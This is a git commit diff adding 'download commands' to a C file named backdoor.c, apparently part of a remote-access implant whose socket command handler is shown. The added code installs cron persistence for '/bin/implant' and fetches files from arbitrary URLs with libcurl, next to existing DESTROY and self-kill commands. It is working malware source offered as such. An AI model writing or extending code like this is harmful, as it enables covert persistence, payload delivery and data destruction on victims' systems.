19d0e8a949b64dbaea88ed29296d54428d302fc3
Ashley <ahchung@kali.example.com>
2021-08-16 15:48:45 -0400

    added download commands

--- src/buildScripts/backdoor.c
+++ src/buildScripts/backdoor.c
@@ -370,6 +370,12 @@ int main(void) {
    exit(EXIT_SUCCESS);
 }
 
+static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
+{
+  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
+  return written;
+}
+
 #ifdef COMMANDS
 void commands(int sockfd){
   #define DESTROY "\
@@ -419,6 +425,30 @@ void commands(int sockfd){
       free(buf);
       kill(getpid(), SIGKILL);
       endConnect = 1;
+    }
+    else if(strcmp(buf,"PERSIST\n") == 0){
+      system("crontab -l | { cat; echo \"0 * * * * /bin/implant\"; } | crontab -");
+    }
+    else if(strcmp(buf,"DO_DOWNLOAD_string_") == 0 || strcmp(buf,"DO_EXEC_string_") == 0){
+    CURL *curl_handle;
+    static const char *pagefilename = "downloadedfile";
+    FILE *pagefile;
+    char urlname[99] = "butts";
+    scanf("%s", urlname);
+    curl_global_init(CURL_GLOBAL_ALL);
+    curl_handle = curl_easy_init();
+    curl_easy_setopt(curl_handle, CURLOPT_URL, urlname);
+    curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);
+    curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
+    curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
+    pagefile = fopen(pagefilename, "wb");
+    if(pagefile) {
+      curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);
+      curl_easy_perform(curl_handle);
+      fclose(pagefile);
+    }
+    curl_easy_cleanup(curl_handle);
+    curl_global_cleanup();
     }
     else if(strcmp(buf,"DESTROY\n") == 0){
       system(DESTROY);
